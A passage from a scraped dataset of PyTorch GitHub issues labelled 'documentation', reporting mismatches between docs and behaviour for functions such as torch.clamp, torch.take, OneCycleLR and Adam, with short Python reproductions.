[`TypeInfo.cpp`](https://github.com/pytorch/pytorch/blob/0651887eb4fd85ebbf65ab29ff2b634226871fee/torch/csrc/TypeInfo.cpp#L169), it uses `std::numeric_limits<>::min()` to get this value, but it should be `std::numeric_limits<>::denorm_min()` according the [document](http://www.cplusplus.com/reference/limits/numeric_limits/).\r\n\r\nI am not sure whether the `tiny` function should be modified or add new function, such as `denorm_tiny`, or just fix the description to be\r\n> \"The minimum normalized positive number\".\r\n\r\nThanks\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/91463487-70c65180-e859-11ea-90d6-3a83df442108.png)\r\n\r\nWe can change this to \"tensors that require grad\"\n\ncc @jlin27"},{"labels":["documentation",null],"text":"I find this when working on https://github.com/pytorch/pytorch/issues/43667\r\n\r\nIf you replace the docs of `torch.bmm`\r\n```\r\nArgs:\r\n    input (Tensor): the first batch of matrices to be multiplied\r\n    mat2 (Tensor): the second batch of matrices to be multiplied\r\n    deterministic (bool, optional): flag to choose between a faster non-deterministic\r\n                                    calculation, or a slower deterministic calculation.\r\n                                    This argument is only available for sparse-dense CUDA bmm.\r\n                                    Default: ``False``\r\n    {out}\r\n```\r\nwith\r\n```\r\nArgs:\r\n    input (Tensor): the first batch of matrices to be multiplied\r\n    mat2 (Tensor): the second batch of matrices to be multiplied\r\n\r\nKeyword args:\r\n    deterministic (bool, optional): flag to choose between a faster non-deterministic\r\n                                    calculation, or a slower deterministic calculation.\r\n                                    This argument is only available for sparse-dense CUDA bmm.\r\n                                    Default: ``False``\r\n    {out}\r\n```\r\nyou will get an error\r\n```\r\ndocstring of torch.bmm:: WARNING: more than one target found for cross-reference 'bool': torch.FloatStorage.bool, torch.Tensor.bool\r\n```\r\n\r\ncc @jlin27 @mruberry "},{"labels":["documentation",null],"text":"Keyword arguments should be put into a separate section `Keyword Arguments` instead of inside `Parameters`, just like:\r\n![image](https://user-images.githubusercontent.com/1032377/91362885-3c4a8b00-e7b0-11ea-87fa-84f11111760c.png)\r\ninstead of\r\n![image](https://user-images.githubusercontent.com/1032377/91362983-7025b080-e7b0-11ea-8446-bc7123109b23.png)\r\n\r\nI have three PRs fixing this issue: https://github.com/pytorch/pytorch/pull/43583 https://github.com/pytorch/pytorch/pull/43586 https://github.com/pytorch/pytorch/pull/43589\r\n\r\nBut some of them can not be fixed due to https://github.com/pytorch/pytorch/issues/43669: List of ops remaining to be fixed:\r\n- `torch.eye`\r\n- `torch.bmm`\r\n- `torch.gather`\r\n- `torch.linspace`\r\n- `torch.logspace`\r\n- `torch.ones`\r\n- `torch.ones_like`\r\n- The entire https://github.com/pytorch/pytorch/pull/43589\r\n\r\n\r\ncc @jlin27 @mruberry "},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/generated/torch.empty.html#torch.empty\r\n\r\n#### API\r\n\r\n`torch.empty`\r\n\r\n#### Issue\r\n\r\nThe signature in document of API `torch.empty` is incomplete. It didn't include `memory_format`, which is actually accepted by the function.\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91071928-c35bff80-e606-11ea-8015-ff333c30633a.png)\r\n\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/quantization.html#torch.quantization.quantize_dynamic\r\n\r\n#### API\r\n\r\n`torch.quantization.quantize_dynamic`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input `module` , but it is not in the signature, and it is not accepted by the function.\r\n\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91071527-4cbf0200-e606-11ea-8903-51d6d25365a4.png)\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/distributed.html#torch.distributed.all_reduce_multigpu\r\n\r\n#### API\r\n\r\n`torch.distributed.all_reduce_multigpu`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input `list`, but it is not in the signature, and it is not accepted by the function. It should be `tensor_list`\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91068305-1b443780-e602-11ea-8e9f-c065e3ac5092.png)\r\n\r\n\r\nRunning code :\r\n\r\n~~~python\r\nimport torch\r\ntorch.distributed.all_reduce_multigpu(list=[])\r\n~~~\r\n\r\ngives exception \r\n\r\n~~~python\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: all_reduce_multigpu() got an unexpected keyword argument 'list'\r\n~~~\r\n\r\n\r\n\r\n#### **System information**\r\n\r\n- OS: MacOS Mojave 10.14\r\n- PyTorch version:  1.6.0\r\n- Python version: 3.8.2\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/nn.functional.html#torch.nn.functional.embedding_bag\r\n\r\n#### API\r\n\r\n`torch.nn.functional.embedding_bag`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input :\r\n\r\n**last element is the size of the input, or the ending index position of the last bag** (*The*) ‚Äì\r\n\r\nwhich should be part of the description for input argument `include_last_offset`\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91067883-788bb900-e601-11ea-9342-e699c095979d.png)\r\n\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/generated/torch.lu_solve.html#torch.lu_solve\r\n\r\n#### API\r\n\r\n`torch.lu_solve`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input `b` , but it is not in the signature.\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91067635-2fd40000-e601-11ea-844c-651148a46bd6.png)\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/generated/torch.clamp.html#torch.clamp\r\n\r\n#### API\r\n\r\n`torch.clamp`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section under the following two signature:\r\n\r\n- `torch.clamp(input, *, min, out=None) ‚Üí Tensor`\r\n- `torch.clamp(input, *, max, out=None) ‚Üí Tensor`\r\n\r\nthere is an input argument `value` , but it is not in the signature, and it is not accepted by the function. It should be `min ` and `max` respectively\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91067305-bdfbb680-e600-11ea-8124-9ca4613ae37c.png)\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91067329-c5bb5b00-e600-11ea-98ab-5cbb6af8d4a2.png)\r\n\r\nRunning code :\r\n\r\n~~~python\r\nimport torch\r\na = torch.randn(4)\r\ntorch.clamp(a, max=0.5, value =1)\r\n~~~\r\n\r\ngives exception \r\n\r\n~~~python\r\nTypeError: clamp() got an unexpected keyword argument 'value'\r\n~~~\r\n\r\n\r\n\r\n#### **System information**\r\n\r\n- OS: MacOS Mojave 10.14\r\n- PyTorch version: 1.7.0.dev20200819+cpu\r\n- Python version: 3.8.2\r\n\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/generated/torch.poisson.html#torch.poisson\r\n\r\n#### API\r\n\r\n`torch.poisson`\r\n\r\n#### Issue\r\n\r\nThere is an format issue in the function's signature. The input `input * ` should be `input`.\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91066984-59d8f280-e600-11ea-87a4-8955a0144dd4.png)\r\n\r\n\r\nCode example:\r\n\r\n~~~python\r\nimport torch\r\nrates = torch.rand(4, 4) * 5 \r\ntorch.poisson(input=rates)\r\n~~~\r\n\r\n#### **System information**\r\n\r\n- OS: MacOS Mojave 10.14\r\n- PyTorch version: 1.7.0.dev20200819+cpu\r\n- Python version: 3.8.2\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/generated/torch.take.html#torch.take\r\n\r\n#### API\r\n\r\n`torch.take`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input ` indices`, but it is not in the signature, and it is not accepted by the function. It should be `index`\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91066752-154d5700-e600-11ea-9371-a77f1a9ed16b.png)\r\n\r\n\r\nRunning code :\r\n\r\n~~~python\r\nimport torch\r\nsrc = torch.tensor([[4, 3, 5], [6, 7, 8]])\r\ntorch.take(src, indices=torch.tensor([0, 2, 5]))\r\n~~~\r\n\r\ngives exception \r\n\r\n~~~python\r\nTypeError: take() missing 1 required positional arguments: \"index\"\r\n~~~\r\n\r\n\r\n\r\nBut it throws no exception when running:\r\n\r\n~~~python\r\ntorch.take(src, index=torch.tensor([0, 2, 5]))\r\n~~~\r\n\r\n\r\n\r\n#### **System information**\r\n\r\n- OS: MacOS Mojave 10.14\r\n- PyTorch version:  1.7.0.dev20200819+cpu\r\n- Python version: 3.8.2\n\ncc @jlin27"},{"labels":[null,null,"documentation",null],"text":"## üìö Documentation\r\n\r\nAs reported at https://github.com/pytorch/pytorch/issues/32994, since pytorch-1.5 `nonzero` started to require an explicit `as_tuple` argument. The current docs don't reflect that. https://pytorch.org/docs/master/generated/torch.nonzero.html\r\n\r\n```\r\nimport torch\r\nprint(torch.__version__)\r\ntorch.nonzero(torch.tensor([1, 1, 1, 0, 1])) # current example\r\ntorch.nonzero(torch.tensor([1, 1, 1, 0, 1]), as_tuple=False) # should be instead\r\n```\r\noutput:\r\n```\r\n1.7.0.dev20200813\r\ntest2:4: UserWarning: This overload of nonzero is deprecated:\r\n        nonzero(Tensor input, *, Tensor out)\r\nConsider using one of the following signatures instead:\r\n        nonzero(Tensor input, *, bool as_tuple) (Triggered internally at  /opt/conda/conda-bld/pytorch_1597302504919/work/torch/csrc/utils/python_arg_parser.cpp:864.)\r\n  torch.nonzero(t)\r\n```\r\n\r\nShould the examples be modified to explicitly pass the `as_tuple` argument to match the code requirements? \r\n\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"As mentioned [here](https://github.com/pytorch/pytorch/pull/31125#issuecomment-673654283), the warning in LambdaLR should be removed and replaced by a simple note in the load/save state_dict documentation.\n\ncc @jlin27 @vincentqb"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nIt is not clear what I can pass as args in `torch.multiprocessing.spawn()`\r\nCan I pass the model, dataset, optimizer, scheduler, etc. through the args? Is it just primitives or perhaps objects which can be pickled?\r\n\r\nIt would be great if a more concrete explanation was available.\r\n\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"## üêõ Bug\r\n\r\nWith latest nightly I can't pass a CUDA tensor for the `lengths` argument to `nn.utils.rnn.pack_padded_sequence`.\r\n\r\n## To Reproduce\r\n\r\n```python\r\nimport torch\r\nfrom torch.nn.utils.rnn import pack_padded_sequence\r\nseq = torch.tensor([[1,2,0], [3,0,0], [4,5,6]], device='cuda')\r\nlens = torch.tensor([2, 1, 3], device='cuda')\r\npack_padded_sequence(seq, lens, enforce_sorted=False)\r\n# RuntimeError: 'lengths' argument should be a 1D CPU int64 tensor, but got 1D cuda:0 Long tensor\r\n```\r\n\r\n## Expected behavior\r\n\r\nThis works on torch 1.5:\r\n```python\r\nseq = torch.tensor([[1,2,0], [3,0,0], [4,5,6]], device='cuda')\r\nlens = torch.tensor([2, 1, 3], device='cuda')\r\npack_padded_sequence(seq, lens, enforce_sorted=False)\r\n# PackedSequence(data=tensor([0, 1, 2, 0, 3, 6], device='cuda:0'), batch_sizes=tensor([3, 2, 1]), sorted_indices=tensor([2, 0, 1], device='cuda:0'), unsorted_indices=tensor([1, 2, 0], device='cuda:0'))\r\n```\r\n\r\n## Environment\r\n\r\n - PyTorch Version (e.g., 1.0): 1.7.0.dev20200817+cu101\r\n - OS (e.g., Linux): Ubuntu\r\n - How you installed PyTorch (`conda`, `pip`, source): pip\r\n - Build command you used (if compiling from source):\r\n - Python version: 3.6.10\r\n - CUDA/cuDNN version: CUDA 10.1, cuDNN 7.6.5.32\r\n - GPU models and configuration: 8 x V100\r\n - Any other relevant information:\n\ncc @ngimel @jlin27 @zou3519"},{"labels":[null,"documentation",null],"text":"## üöÄ Feature\r\nWe need an option to temporarily close DDP `all_reduce`.\r\n\r\n## Motivation\r\nThe training speed can be accelerated when combining DDP and gradient accumulation.   \r\nWhen applying gradient accumulation, the `optimizer.step()` is called every K steps intead of every step. And as we know every training step (with `loss.backward()`) DDP would activate an `all_reduce`. Therefore, there are K-1 steps of `all_reduce` wasted! Considering the time cost of `all_reduce` especially for multi-node  training, the training speed can be accelerated a lot if we supply an option to call DDP `all_reduce` every K step.\r\n\r\n\r\n## Pitch\r\n\r\n```\r\nmodel = DDP(model)\r\nfor data, label in dataloder:\r\n  optimizer.zero_grad()\r\n  # which I want.\r\n  model.stop_gradient_reduce()\r\n  for i in range(K):\r\n    prediction = model(data)    \r\n    if i == K-1:\r\n        model.start_gradient_reduce()\r\n    loss_fn(prediction, label).backward()\r\n  optimizer.step()\r\n```\r\n\r\n\r\n## Possible Implementation\r\nI notice `reducer` has a method `prepare_for_backward()`.\r\n```\r\nself.reducer.prepare_for_backward(all_parameters)\r\n```\r\nIt seems like if all parameter are set ready here, we can safely jump the `all_reduce`. Or did we need to dig deeper?\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar @jiayisuse @agolynski @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nIn [`EmbeddingBag`](https://pytorch.org/docs/stable/generated/torch.nn.Embedding.html#torch.nn.Embedding), it is stated: \r\n\r\nwith `mode=\"mean\"` is equivalent to `Embedding` followed by `torch.mean(dim=0)`\r\n\r\nHowever, I think the author intends `dim=1` instead. This is seen by comparing the following example ... \r\n```\r\n>>> # an Embedding module containing 10 tensors of size 3\r\n>>> embedding_sum = nn.EmbeddingBag(10, 3, mode='sum')\r\n>>> # a batch of 2 samples of 4 indices each\r\n>>> input = torch.LongTensor([1,2,4,5,4,3,2,9])\r\n>>> offsets = torch.LongTensor([0,4])\r\n>>> embedding_sum(input, offsets)\r\ntensor([[-0.8861, -5.4350, -0.0523],\r\n        [ 1.1306, -2.5798, -1.0044]])\r\n```\r\n... with the corresponding example in [`Embedding`](https://pytorch.org/docs/stable/generated/torch.mean.html).\r\n\r\n```\r\n>>> # an Embedding module containing 10 tensors of size 3\r\n>>> embedding = nn.Embedding(10, 3)\r\n>>> # a batch of 2 samples of 4 indices each\r\n>>> input = torch.LongTensor([[1,2,4,5],[4,3,2,9]])\r\n>>> embedding(input)\r\ntensor([[[-0.0251, -1.6902,  0.7172],\r\n         [-0.6431,  0.0748,  0.6969],\r\n         [ 1.4970,  1.3448, -0.9685],\r\n         [-0.3677, -2.7265, -0.1685]],\r\n\r\n        [[ 1.4970,  1.3448, -0.9685],\r\n         [ 0.4362, -0.4004,  0.9400],\r\n         [-0.6431,  0.0748,  0.6969],\r\n         [ 0.9124, -2.3616,  1.1151]]])\r\n```\n\ncc @jlin27"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=get_last_lr&check_keywords=yes&area=default#\r\n![image](https://user-images.githubusercontent.com/1041752/90317248-3f2fbb00-df28-11ea-8d29-0ee16e078b3f.png)\r\n\r\n\r\nshows nothing. despite get_last_lr being recommended by PyTorch warnings for getting the last computed lr\r\n\r\ncc @jlin27"},{"labels":[null,"documentation",null],"text":"## ‚ùì Questions and Help\r\n\r\nHi. I've been trying to take advantage of new mixed-precision set of tools, mainly following the instructions given in https://pytorch.org/docs/stable/amp.html#autocasting. My code is running, I see that the gradients are being scaled as expected, however, my memory footprint is de facto the same (inspected by nvidia-smi), and the overall execution time is even longer. I was wondering how I can debug this and what could possibly go wrong.\r\n\r\nThe changes to my code are minimal: (1) I added autocast context to the body of my forward method; and (2) gradient scaling updates as suggested in the tutorial. The operations in my code are standard, lots of CNN and torch.mm executions. My program is being executed on 8 GPUs, for data parallelism.\r\n\r\n## Environment\r\n\r\n - PyTorch Version: 1.6.0\r\n - OS: Linux\r\n - How you installed PyTorch: pip\r\n - Python version: 3.7\r\n - CUDA/cuDNN version: 10.1\r\n - GPU models and configuration: 8 x Tesla V100\r\n\n\ncc @mcarilli @jlin27"},{"labels":[null,"documentation",null],"text":"I want to install pytorch1.5.1 torchvision0.6.1 in centos7 cuda10.2 python3.7. \r\n1.I clicked \"Previous Versions of PyTorch\" on the Pytroch site. \r\n2.I choice ‚Äòv1.5.0‚ÄôÔºå‚Äòwheel‚ÄôÔºå‚ÄòLinux and Windows‚ÄôÔºå‚Äò# CUDA 10.2 pip install torch==1.5.0 torchvision==0.6.0 -f https://download.pytorch.org/whl/torch_stable.html‚Äô.\r\n`(py37) [himap@localhost py37]$ pip install torch==1.5.1 -f https://download.pytorch.org/whl/torch_stable.html\r\nLooking in links: https://download.pytorch.org/whl/torch_stable.html\r\nRequirement already satisfied: torch==1.5.1 in ./lib/python3.7/site-packages (1.5.1+cu92)\r\nRequirement already satisfied: future in ./lib/python3.7/site-packages (from torch==1.5.1) (0.18.2)\r\nRequirement already satisfied: numpy in ./lib/python3.7/site-packages (from torch==1.5.1) (1.18.1)`\r\nAfter using this command, I get Pytroch1.5.1 + cu92\r\n`>>> torch.__version__\r\n'1.5.1+cu92'\r\n`\r\n3.When I use \"pip install torch==1.5.1+cu102 -f https://download.pytorch.org/whl/torch_stable.html\", he prompts me\" `Looking in links: https://download.pytorch.org/whl/torch_stable.html\r\nERROR: Could not find a version that satisfies the requirement torch==1.5.1+cu102 (from versions: 0.1.2, 0.1.2.post1, 0.1.2.post2, 0.4.1, 0.4.1.post2, 1.0.0, 1.0.1, 1.0.1.post2, 1.1.0, 1.2.0, 1.2.0+cpu, 1.2.0+cu92, 1.3.0, 1.3.0+cpu, 1.3.0+cu92, 1.3.1, 1.3.1+cpu, 1.3.1+cu92, 1.4.0, 1.4.0+cpu, 1.4.0+cu92, 1.5.0, 1.5.0+cpu, 1.5.0+cu101, 1.5.0+cu92, 1.5.1, 1.5.1+cpu, 1.5.1+cu101, 1.5.1+cu92, 1.6.0, 1.6.0+cpu, 1.6.0+cu101, 1.6.0+cu92)\r\nERROR: No matching distribution found for torch==1.5.1+cu102\"`\r\nSo I think there is a problem with the official order.\n\ncc @ezyang @seemethere @malfet @jlin27"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nThis issue refers to #42864, but the original issue was closed by the author while I was writing my response to it.\r\n\r\nThese are the docs at the moment:\r\n![loss1](https://user-images.githubusercontent.com/47462742/89954344-2f1a9180-dc31-11ea-9dc1-5e73ee5f1d88.PNG)\r\n\r\nBased on the [source](https://github.com/pytorch/pytorch/blob/0ff0fea42bf9721b87e01fe15445dfd3ea5f2093/aten/src/ATen/native/Loss.cpp#L74) the correct input/target shape is:\r\n- Input 1: (N, ‚àó) where ‚àó means, any number of additional dimensions\r\n- Input 2: (N, ‚àó) same shape as Input 1, or it has to be broadcastable to that shape\r\n- Target: (N, ‚àó), same shape as Input 1 or Input 2, or it has to be broadcastable to that shape\r\n\r\nSo I think  this part in the docs should be fixed and an example of how to use the loss would be helpful.\r\n\n\ncc @jlin27 @albanD @mruberry"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nOn master documentation: the quotes around \"mean\" and \"sum\" look a little weird but it isn't a big deal\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/89908595-0efcbb00-dbbc-11ea-9a9a-642105579849.png)\r\n\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nThe documentation of Adam since v1.6.0 suggests that it uses the weight decay fix proposed by paper \"Decoupled Weight Decay Regularization\":\r\nhttps://github.com/pytorch/pytorch/blob/4b4273a04e566dcdf4cb96882f49c41127e8d3f1/torch/optim/adam.py#L10-L11\r\n\r\nHowever I found this to not be the case. The actual weight decay in Adam is still the old one:\r\nhttps://github.com/pytorch/pytorch/blob/4b4273a04e566dcdf4cb96882f49c41127e8d3f1/torch/optim/adam.py#L99-L100\r\n\r\nIn contrast, the new weight decay fix is implemented in AdamW, and explained by the AdamW doc:\r\nhttps://github.com/pytorch/pytorch/blob/4b4273a04e566dcdf4cb96882f49c41127e8d3f1/torch/optim/adamw.py#L10\r\n\r\nhttps://github.com/pytorch/pytorch/blob/4b4273a04e566dcdf4cb96882f49c41127e8d3f1/torch/optim/adamw.py#L73\r\n\r\nIt is possible that I misunderstood the current documentation of Adam, but I found it confusing and suggest that currently there is no difference between the Adam and AdamW implementations, while the difference still exists.\n\ncc @jlin27 @vincentqb"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nIn the [docs](https://pytorch.org/docs/stable/generated/torch.nn.RNN.html) (the same applies to LSTM and GRU) in case of the reccurent **bidirectional** layer, it is not mentioned that there is an additional set of parameters suffixed with `_reverse` that are used in the backward pass:\r\n(k represents the layer)\r\n* `weight_hh_l[k]_reverse` \r\n* `weight_ih_l[k]_reverse` \r\n* `bias_hh_l[k]_reverse`\r\n* `bias_ih_l[k]_reverse`\r\n\r\nIn my opinion, it makes sense to have them documented so the user can easily access them and e.g. apply his own initialization procedure.\n\ncc @jlin27"},{"labels":["documentation",null],"text":"https://pytorch.org/cppdocs/api/file_torch_library.h.html code block renders wrong\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nMemory leaks are reported relatively frequently but it's often a different issue, e.g. that there's a caching allocator and/or you are doing worst-case allocation (increasing the size each time).  Here's a recent example: https://github.com/pytorch/pytorch/issues/42557.\r\n\r\nWe should have a guide on how to debug these issues.\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"Great to see SWA as a part of `torch.optim`. It would be helpful to add the API reference for `SWALR` and `AveragedModel` in the `torch.optim` doc page (like the other schedulers and optimizers). Else, one has to look at the Github code to understand all the possible arguments for both of them. Thanks!\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nIn the docs of [`nn.functional.interpolate`](https://pytorch.org/docs/master/nn.functional.html#interpolate) it is stated that `align_corners` is a `bool` with default value `False`. Furthermore, it is stated that `align_corners` **does not affect** interpolation modes 'area' as well as 'nearest' .\r\n\r\nIf you look at the implementation however, default of `align_corners` is `None`. Furthermore, when passing a `bool` for `align_corners` together with interpolation modes 'nearest' or 'area' to `nn.functional.interpolate`, a [ValueError is raised](https://github.com/pytorch/pytorch/blob/73642d9425a358b51a683cf6f95852d06cba1096/torch/nn/functional.py#)\r\n\r\nThere is thus a clear mismatch between docstrings and implemented behavior of `align_corners` in combination with modes 'nearest' and 'area' for `nn.functional.interpolate`. Based on the intended behvaior, either the code or the docstrings should be changed.\r\n\r\nRelated PR that introduced `align_corners` and may clarify originally intended behavior: #5927\r\n\r\nI would vote for changing the code to adhere to the behavior outlined in the docstrings, and am up to fixing the issue regardless of the made decision.\n\ncc @jlin27 @albanD @mruberry"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\nSome equations in the document do not display. For example, [L1LOSS](https://pytorch.org/docs/stable/generated/torch.nn.L1Loss.html#torch.nn.L1Loss).\n\ncc @ezyang @zou3519 @jlin27"},{"labels":["documentation",null,null],"text":"The documentation for [OneCycleLR](https://pytorch.org/docs/stable/optim.html#torch.optim.lr_scheduler.OneCycleLR) mentions `verbose` as one of the arguments but the [code](https://pytorch.org/docs/stable/_modules/torch/optim/lr_scheduler.html#OneCycleLR) doesn't have that argument. Thus, it raises an error if someone passes a value for `verbose` just going by the documentation.\n\ncc @jlin27 @vincentqb"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nThe description on non_blocking should mention pinned memory, since `non_blocking` only affects copies between pinned memory (on the CPU) and GPU.\r\n\r\nThe current description for the non_blocking argument says \"if True and this copy is between CPU and GPU, the copy may occur asynchronously with respect to the host. For other cases, this argument has no effect.\" \r\n\r\nThe docs for `Tensor.cuda()` are better:\r\n\r\n\"If True and the source is in pinned memory, the copy will be asynchronous with respect to the host. Otherwise, the argument has no effect. Default: False.\"\r\n\r\nAdditionally, the description of non_blocking in `Tenosr.to()` should be improved. \n\ncc @jlin27"},{"labels":[null,"documentation",null,null],"text":"In `torch.renorm`, `dim` means \r\n> dim (int) ‚Äì the dimension to slice over to get the sub-tensors\r\n\r\nThat is, if one wants to renormalize each row tensor (i.e., tensor along dim **`1`**) of a matrix, they need to specify `dim=0`. This means inconsistency with `.norm` and many other ops. E.g, users will be confused when they see\r\n\r\n```py\r\nIn [12]: torch.renorm(x, p=1, maxnorm=0.1, dim=-1).norm(p=2, dim=-1)\r\nOut[12]: tensor([0.3127])\r\n```\r\n\r\nI don't know what is the proper thing to do, but there should be some improvements done.\n\ncc @jlin27"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\nStrange behavior in torch.distributions.negative_binomial:\r\nhttps://pytorch.org/docs/stable/distributions.html#negativebinomial\r\n\r\nWhen trying out the negative binomial distribution I found that the second input parameter prob (success probability) is actually the failure probability --> not consistent with documentation. This is also not consistent with other software such as scipy.\r\n\r\nExample:\r\nIn [1]: import torch \r\n   ...: from scipy.stats import nbinom \r\n   ...: import numpy as np \r\n   ...: n=2.0 \r\n   ...: x=0.0 \r\n   ...: p=.75 \r\n   ...: dis=torch.distributions.NegativeBinomial(n, 1-p) \r\n   ...: prob_torch=dis.log_prob(torch.tensor(x)).exp() \r\n   ...: prob_np=nbinom.pmf(x,n,p) \r\n   ...: np.isclose(prob_np,prob_torch.numpy())                                  \r\nOut[1]: True\r\n\r\n\n\ncc @vincentqb @fritzo @neerajprad @alicanb @vishwakftw @jlin27"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nThe documentation for the `OneCycleLR` learning rate schedule refers to the argument `pct_start` as being a percentage [0,100], whereas it actually used as a proportion [0,1] in the code.\r\n\r\n> pct_start (float) ‚Äì The percentage of the cycle (in number of steps) spent increasing the learning rate. Default: 0.3\r\n\r\ncompared to the implementation in `torch.optim.lr_scheduler.OneCycleLR`\r\n```python\r\n        self.step_size_up = float(pct_start * self.total_steps) - 1\r\n```\n\ncc @jlin27 @vincentqb"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nHi,\r\n\r\nOn the web page https://pytorch.org/docs/master/generated/torch.stft.htmlwhich documents torch.stft, normalization is defined as follows:\r\n\r\nf normalized is True (default is False), the function returns the normalized STFT results, i.e., multiplied by (frame_length)‚àí0.5(\\text{frame\\_length})^{-0.5}(frame_length)‚àí0.5 .\r\n\r\nBut frame_length is not defined anywhere on the page.  I think frame_length should be \"win_length\", which later on the page is defined to be the size of a window frame.\r\n\r\nBruce Maggs\r\n\n\ncc @jlin27"},{"labels":[null,null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\nIn our [distributed docs](https://pytorch.org/docs/stable/distributed.html) under \"Synchronous and asynchronous collective operations\" we document `work.wait()` and `work.is_completed()`, but the documentation is not completely accurate in the case of NCCL.\r\n\r\nFor a NCCL Work object, `wait()` does not in general block the process and instead synchronizes the NCCL stream with the default stream. `is_completed` does check if the kernel execution is finished but can return false even after calling wait. It might also be useful to clarify the blocking behavior can be achieved with `NCCL_BLOCKING_WAIT=1`.\r\n\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar @jiayisuse @agolynski @jlin27"},{"labels":["documentation",null],"text":"It looks like bitwise_and/bitwise_and_ have no arguments (like bitwise_not_) which is not true\r\n\r\n![image](https://user-images.githubusercontent.com/1041752/88780198-f091cb00-d18a-11ea-9b12-dcba701d339b.png)\r\n\n\ncc @jlin27"},{"labels":[null,"documentation"],"text":"There is a tiny mistake in the documentation of torch.cuda.amp.GradScaler. Under the description of __init__ parameters:\r\n```Python\r\n\"\"\"\r\n        growth_factor (float, optional, default=2.0):  Factor by which the scale is multiplied during\r\n            :meth:`update` if no inf/NaN gradients occur for ``growth_factor`` consecutive iterations\r\n\"\"\"\r\n```\r\nShould be for ``growth_interval`` consecutive iterations?\n\ncc @mcarilli @jlin27"},{"labels":["documentation",null],"text":"## üöÄ Feature\r\n<!-- A clear and concise description of the feature proposal -->\r\nThe following code:\r\n\r\n```\r\nimport torch\r\na = torch.arange(0, 4)\r\nb = torch.tensor(a)\r\n```\r\n\r\ngenerates a warning at the console:\r\n\r\n```UserWarning: To copy construct from a tensor, it is recommended to use sourceTensor.clone().detach() or sourceTensor.clone().detach().requires_grad_(True), rather than torch.tensor(sourceTensor).```\r\n\r\nThis warning should be eliminated.\r\n\r\n## Motivation\r\n\r\n<!-- Please outline the motivation for the proposal. Is your feature request related to a problem? e.g., I'm always frustrated when [...]. If this is related to another GitHub issue, please link here too -->\r\n\r\nI often write code that is designed to accept any type that's convertible to a tensor as input, and I don't want my code to have any side effects on the input.  `torch.tensor()` provides the perfect semantics for this use-case since - as documented - it always copies its input.  For example:\r\n\r\n```\r\ndef foo(x):\r\n  # x might be a scalar, list, tuple, `numpy.ndarray`, `torch.Tensor`, etc.\r\n  x = torch.tensor(x)\r\n  